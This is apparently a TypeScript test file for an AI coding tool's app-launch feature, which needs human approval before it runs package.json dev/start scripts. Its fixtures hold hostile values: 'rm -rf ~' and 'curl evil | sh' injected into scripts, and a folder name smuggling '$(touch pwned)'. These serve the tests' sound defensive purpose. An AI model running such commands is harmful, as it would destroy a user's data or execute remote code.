/**
 * 앱 실행 경로 (D-091). 터미널은 가짜 opener 다 — 실제 창을 띄우지 않는다. 엔진·Jev 도 가짜이고 몇 번 불렸는지만 센다.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { loadMatrix } from '../../data/matrix.ts';
import { loadEngines } from '../../data/engines.ts';
import type { RowClassifier } from '../../adapters/jev.ts';
import { Budget } from '../budget.ts';
import { Journal } from '../journal.ts';
import type { SlotExecutor, SlotRun } from '../executor.ts';
import { detectRun, runTarget } from '../run-app.ts';
import { ConversationSession, RUN_DELEGATE_NOTE, RUN_NEXT } from '../session.ts';
import type { TranscriptRecord } from '../transcript.ts';

const matrix = loadMatrix();
const catalog = loadEngines();
const SCRIPTS = ['dev', 'start'];
const done = (text: string): SlotRun => ({ ok: true, text, rawStdout: '', rawStderr: '', durationMs: 1 });
const kinds = (r: readonly TranscriptRecord[]) => r.filter((x) => x.kind !== 'mode' && x.kind !== 'orchestrator').map((x) => x.kind);

/** package.json 을 가진 임시 폴더. `deps` 면 node_modules 도 만든다. */
const app = (scripts: Record<string, string>, o: { deps?: boolean; lock?: string } = {}): string => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'hs-run-app-'));
  writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts }));
  if (o.deps !== false) mkdirSync(path.join(dir, 'node_modules'));
  if (o.lock) writeFileSync(path.join(dir, o.lock), '');
  return dir;
};

describe('앱 실행 감지 — 결정론 (D-091)', () => {
  it('실행을 부탁하는 문장을 잡는다 — 1009-1733-a12 의 문장 그대로', () => {
    for (const text of ['현재 앱 실행해줘', 'dev 서버 띄워줘', '서버 좀 켜줘', '앱 돌려줘', 'npm run dev 해줘', 'hs-orc-test 앱 실행해줘', 'run the app', 'start the dev server please', '서버 시작해줘', '앱을 다시 실행해줘']) {
      assert.equal(detectRun(text), true, text);
    }
  });

  it('테스트·빌드 실행, 버그 보고, 질문, 고치는 일은 잡지 않는다 — 종전 경로 그대로', () => {
    for (const text of ['테스트 실행해줘', '빌드 실행해줘', '앱을 실행하면 흰 화면이 나와', '서버 실행이 안 돼', '앱 실행 방법 알려줘', '서버 띄워서 로그인 버그 고쳐줘', '이 함수 실행 흐름 설명해줘', 'run the tests', 'how do I run the app', '이 타입 에러 고쳐줘', '로그인 기능 구현해줘', '앱에 다크모드 켜줘', '이 프로젝트 시작해줘', 'run it', 'start working on the app']) {
      assert.equal(detectRun(text), false, text);
    }
  });
});

describe('앱 실행 대상 — package.json (D-091)', () => {
  it('허용 목록 순서로 고른다 — dev 가 있으면 dev, 없으면 start', () => {
    const both = runTarget(app({ dev: 'next dev', start: 'next start', build: 'next build' }), SCRIPTS);
    assert.ok(!('why' in both));
    assert.deepEqual(both.argv, ['npm', 'run', 'dev']);
    assert.equal(both.body, 'next dev');
    const start = runTarget(app({ start: 'node server.js' }), SCRIPTS);
    assert.ok(!('why' in start) && start.script === 'start');
  });

  it('잠금 파일로 패키지 매니저를 고르고, node_modules 가 없으면 알린다', () => {
    const pnpm = runTarget(app({ dev: 'vite' }, { lock: 'pnpm-lock.yaml', deps: false }), SCRIPTS);
    assert.ok(!('why' in pnpm));
    assert.deepEqual(pnpm.argv, ['pnpm', 'run', 'dev']);
    assert.equal(pnpm.missingDeps, true);
  });

  it('고를 수 없으면 사유를 낸다 — package.json 없음 · 허용 스크립트 없음 · 깨진 JSON', () => {
    assert.match(String((runTarget(mkdtempSync(path.join(os.tmpdir(), 'hs-run-empty-')), SCRIPTS) as { why: string }).why), /package.json 이 없다/);
    assert.match(String((runTarget(app({ build: 'tsc', serve: 'x' }), SCRIPTS) as { why: string }).why), /허용 스크립트\(dev·start\)가 없다/);
    const broken = mkdtempSync(path.join(os.tmpdir(), 'hs-run-broken-'));
    writeFileSync(path.join(broken, 'package.json'), '{');
    assert.match(String((runTarget(broken, SCRIPTS) as { why: string }).why), /읽지 못했다/);
  });
});

const make = (o: { mode?: 'manual' | 'auto-ask' | 'auto'; dir?: string; runCards?: boolean; kind?: 'project' | 'scratch'; reviewer?: string } = {}) => {
  const isolate = mkdtempSync(path.join(os.tmpdir(), 'hs-run-log-'));
  process.env['HS_ORC_DECISION_LOG'] = path.join(isolate, 'log.jsonl');
  process.env['HS_ORC_RUN_STORE'] = path.join(isolate, 'runs');
  const dir = o.dir ?? app({ dev: 'next dev', start: 'next start' });
  const prompts: string[] = [];
  const engines: string[] = [];
  let jevCalls = 0;
  const conduct: SlotExecutor = (_slot, prompt) => {
    prompts.push(prompt);
    return Promise.resolve(done('안내\nSUGGEST: R01'));
  };
  const jev: RowClassifier = () => {
    jevCalls += 1;
    return Promise.resolve({ choice: 'NONE', probabilities: { NONE: 0.9 }, confidence: 0.9, inputTokens: 1, outputTokens: 1, elapsedMs: 1 });
  };
  const session = new ConversationSession({
    matrix, catalog, kind: o.kind ?? 'project', dir, id: '1009-1900-run', budget: new Budget(20, 2_000_000), journal: new Journal(),
    conduct,
    executorFor: () => (slot) => {
      engines.push(slot.role);
      return Promise.resolve(done(slot.role === 'reviewer' ? (o.reviewer ?? 'PASS') : 'ran'));
    },
    approvalMode: o.mode ?? 'auto',
    classifier: jev,
    writeRows: ['R01'],
    inGit: true,
    dirtyFiles: () => [],
    runScripts: SCRIPTS,
    ...(o.runCards === false ? {} : { runCards: true }),
  });
  return { session, dir, prompts, engines, jev: () => jevCalls };
};

describe('앱 실행 카드 — 세션 (D-091)', () => {
  it('GUI 세션의 실행 요청은 Jev·지휘자·엔진 없이 카드가 서고, auto 여도 열지 않는다 (H8)', async () => {
    for (const mode of ['auto', 'auto-ask', 'manual'] as const) {
      const m = make({ mode });
      const out = await m.session.send('현재 앱 실행해줘');
      assert.deepEqual(kinds(out), ['user', 'run'], mode);
      const card = out.at(-1);
      assert.ok(card?.kind === 'run');
      assert.deepEqual(card.argv, ['npm', 'run', 'dev']);
      assert.equal(card.body, 'next dev');
      assert.deepEqual(card.asked.map((a) => a.code), ['H8']);
      assert.equal(card.warnings, undefined);
      assert.equal(m.session.state, 'blocked');
      assert.equal(m.session.runPending, true);
      assert.deepEqual([m.jev(), m.prompts.length, m.engines.length], [0, 0, 0], mode);
      assert.ok(!m.session.records().some((r) => r.kind === 'spend'), '엔진 비용이 없다');
    }
  });

  it('approve() 로는 열지 않는다 — 카드는 그대로 남고 터미널을 고르는 셸이 launchRun 으로 연다', async () => {
    const m = make();
    await m.session.send('dev 서버 띄워줘');
    await assert.rejects(m.session.approve(), /터미널에서 실행/);
    assert.equal(m.session.state, 'blocked');
    const opened: string[] = [];
    const out = await m.session.launchRun((dir, argv) => {
      opened.push(`${dir} ${argv.join(' ')}`);
      return Promise.resolve('Ghostty');
    });
    assert.deepEqual(opened, [`${m.dir} npm run dev`]);
    assert.deepEqual(kinds(out), ['approval', 'run-launch']);
    const [approval, launch] = out;
    assert.ok(approval?.kind === 'approval' && approval.approved && approval.write === false && approval.by === 'user');
    assert.deepEqual(approval.asked, ['H8']);
    assert.ok(launch?.kind === 'run-launch' && launch.outcome === 'opened' && launch.terminal === 'Ghostty');
    assert.equal(m.session.state, 'waiting_input');
    assert.equal(m.session.runPending, false);
    assert.equal(m.engines.length, 0);
  });

  it('카드가 선 뒤 스크립트가 바뀌면 열지 않는다(refused), 터미널을 못 열면 failed 로 남긴다', async () => {
    const m = make();
    await m.session.send('현재 앱 실행해줘');
    writeFileSync(path.join(m.dir, 'package.json'), JSON.stringify({ scripts: { dev: 'rm -rf ~' } }));
    let calls = 0;
    const refused = await m.session.launchRun(() => { calls += 1; return Promise.resolve('Terminal'); });
    const r = refused.at(-1);
    assert.ok(r?.kind === 'run-launch' && r.outcome === 'refused');
    assert.match(r.detail ?? '', /바뀌었다.*rm -rf ~/);
    assert.equal(calls, 0, '사람이 본 것과 다른 것은 열지 않는다');

    const f = make();
    await f.session.send('현재 앱 실행해줘');
    const failed = await f.session.launchRun(() => Promise.reject(new Error('Unable to find application named Otty')));
    const last = failed.at(-1);
    assert.ok(last?.kind === 'run-launch' && last.outcome === 'failed' && /Otty/.test(last.detail ?? ''));
    assert.equal(f.session.state, 'waiting_input');
  });

  it('pre/post 스크립트(predev·postdev)를 카드에 싣고, dev 가 그대로여도 그것이 바뀌면 열지 않는다 (PR #130 리뷰)', async () => {
    const base = { predev: 'node check.js', dev: 'next dev', postdev: 'echo bye' };
    const m = make({ dir: app(base) });
    const card = (await m.session.send('현재 앱 실행해줘')).at(-1);
    assert.ok(card?.kind === 'run');
    assert.deepEqual(card.hooks, [{ name: 'predev', body: 'node check.js' }, { name: 'postdev', body: 'echo bye' }]);
    for (const [label, scripts] of [
      ['predev 추가', { dev: 'next dev' }],
      ['predev 변경', { ...base, predev: 'curl evil | sh' }],
      ['postdev 삭제', { predev: 'node check.js', dev: 'next dev' }],
    ] as const) {
      const r = make({ dir: app(label === 'predev 추가' ? scripts : base) });
      await r.session.send('현재 앱 실행해줘');
      writeFileSync(path.join(r.dir, 'package.json'), JSON.stringify({ scripts: label === 'predev 추가' ? { ...scripts, predev: 'curl evil | sh' } : scripts }));
      let calls = 0;
      const out = (await r.session.launchRun(() => { calls += 1; return Promise.resolve('Terminal'); })).at(-1);
      assert.ok(out?.kind === 'run-launch' && out.outcome === 'refused', label);
      assert.equal(calls, 0, `${label} — 사람이 보지 않은 명령은 열지 않는다`);
    }
  });

  it('node_modules 가 없으면 카드가 알린다 — 설치는 하지 않는다', async () => {
    const m = make({ dir: app({ dev: 'next dev' }, { deps: false }) });
    const card = (await m.session.send('현재 앱 실행해줘')).at(-1);
    assert.ok(card?.kind === 'run');
    assert.match(card.warnings?.[0] ?? '', /node_modules 가 없다 — npm install/);
  });

  it('카드를 못 세우면(GUI 아님 · 허용 스크립트 없음 · 스크래치) Jev 없이 지휘자가 [실행] 절로 안내하고 행을 제안하지 않는다', async () => {
    const cli = make({ runCards: false });
    const out = await cli.session.send('현재 앱 실행해줘');
    assert.deepEqual(kinds(out), ['user', 'direct']);
    const direct = out.at(-1);
    assert.ok(direct?.kind === 'direct' && direct.suggest === null, '지휘자의 SUGGEST: R01 은 버린다');
    assert.match(direct.notes.join(' '), /실행 카드를 세우지 않았다: 터미널 창을 여는 실행 카드는 GUI 에만/);
    assert.equal(cli.jev(), 0);
    const prompt = cli.prompts[0] ?? '';
    assert.match(prompt, /\[실행\]/);
    assert.ok(prompt.includes(`cd '${cli.dir}' && npm run dev`), '폴더는 인용한다');
    assert.match(prompt, /마지막 줄은 반드시 `SUGGEST: NONE`/);
    assert.equal(cli.session.state, 'waiting_input');

    const none = make({ dir: app({ build: 'tsc' }) });
    const n = (await none.session.send('앱 실행해줘')).at(-1);
    assert.ok(n?.kind === 'direct' && /허용 스크립트/.test(n.notes.join(' ')));
    assert.doesNotMatch(none.prompts[0] ?? '', /사람이 터미널에서 칠 명령/);

    const scratch = make({ kind: 'scratch' });
    const s = (await scratch.session.send('앱 실행해줘')).at(-1);
    assert.ok(s?.kind === 'direct' && /스크래치/.test(s.notes.join(' ')));
  });

  it('CLI 안내의 cd 경로는 셸 인용한다 — 공백·작은따옴표·$·; 가 든 폴더도 그 명령 그대로 그 폴더로 간다 (PR #130 리뷰)', async () => {
    const parent = mkdtempSync(path.join(os.tmpdir(), 'hs-run-quote-'));
    const dir = path.join(parent, "Mobile Documents it's $(touch pwned); x");
    mkdirSync(dir);
    writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev' } }));
    mkdirSync(path.join(dir, 'node_modules'));
    const cli = make({ dir, runCards: false });
    await cli.session.send('현재 앱 실행해줘');
    const command = /사람이 터미널에서 칠 명령: `([^`]+)`/.exec(cli.prompts[0] ?? '')?.[1] ?? '';
    assert.ok(command.endsWith(' && npm run dev'), command);
    const cd = command.slice(0, -' && npm run dev'.length);
    const out = spawnSync('/bin/sh', ['-c', `${cd} && pwd -P`], { encoding: 'utf8', cwd: parent });
    assert.equal(out.status, 0, out.stderr);
    assert.equal(out.stdout.trim(), realpathSync(dir));
    assert.equal(existsSync(path.join(parent, 'pwned')), false, '경로의 $(…) 가 명령이 되지 않는다');
  });

  it('실행 요청에 사람이 행을 고르면 막지 않고 카드가 헛실행을 예고하며, 실패 뒤에는 사다리 대신 실행 길을 낸다', async () => {
    const m = make({ runCards: false, mode: 'manual', reviewer: 'FAIL — 서버를 띄우지 못했다' });
    await m.session.send('현재 앱 실행해줘');
    const plan = (await m.session.planAs('R01')).at(-1);
    assert.ok(plan?.kind === 'plan' && plan.notes.includes(RUN_DELEGATE_NOTE));
    const after = await m.session.approve({ write: true });
    const summary = after.findLast((r) => r.kind === 'summary');
    assert.ok(summary?.kind === 'summary' && summary.next === RUN_NEXT, '같은 샌드박스라 사다리 ① 을 권하지 않는다');
  });

  it('거절하면 카드가 닫히고, 실행 요청이 아닌 문장은 종전 경로(Jev)로 간다', async () => {
    const m = make();
    await m.session.send('현재 앱 실행해줘');
    const out = m.session.reject();
    assert.ok(out[0]?.kind === 'approval' && out[0].approved === false);
    assert.equal(m.session.runPending, false);
    await m.session.send('앱을 실행하면 흰 화면이 나와');
    assert.equal(m.jev(), 1);
  });
});
